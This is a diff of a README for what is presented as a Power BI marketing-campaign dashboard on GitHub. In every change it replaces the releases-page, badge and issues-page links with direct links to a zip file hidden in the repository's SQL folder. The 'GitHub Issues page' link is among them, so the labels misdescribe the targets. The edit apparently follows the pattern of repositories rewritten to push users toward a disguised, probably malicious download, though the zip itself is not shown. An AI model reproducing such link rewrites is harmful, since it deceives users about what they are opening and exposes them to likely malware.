@@ -1,6 +1,6 @@
 # 📊 Marketing-Campaign-Analytics-Dashboard-using-Power-BI - Analyze Your Marketing Performance Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
+[![Download Now](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To use this application effectively, ensure your system meets the following requ
 You can easily download and install the application by following these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the release page.
-   [Visit Release Page to Download](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
+   [Visit Release Page to Download](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip)
    
 2. **Find the Latest Release:** Look for the most recent version listed on the page. This version will typically have the highest version number.
 
@@ -62,7 +62,7 @@ If you encounter issues, consider the following:
 
 ## 💬 Getting Help
 
-For further assistance, feel free to open an issue on our [GitHub Issues page](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/issues). Provide details about your problem, and we will do our best to assist you.
+For further assistance, feel free to open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip). Provide details about your problem, and we will do our best to assist you.
 
 ## 📄 Topics Covered
 
@@ -84,4 +84,4 @@ For further assistance, feel free to open an issue on our [GitHub Issues page](h
 
 For updates and announcements, consider watching our repository. Enjoy maximizing your marketing performance! 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/releases)
+[![Download Now](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/PierLuigi13/Marketing-Campaign-Analytics-Dashboard-using-Power-BI/main/SQL/Marketing-Campaign-Analytics-Dashboard-using-Power-BI_1.0.zip)
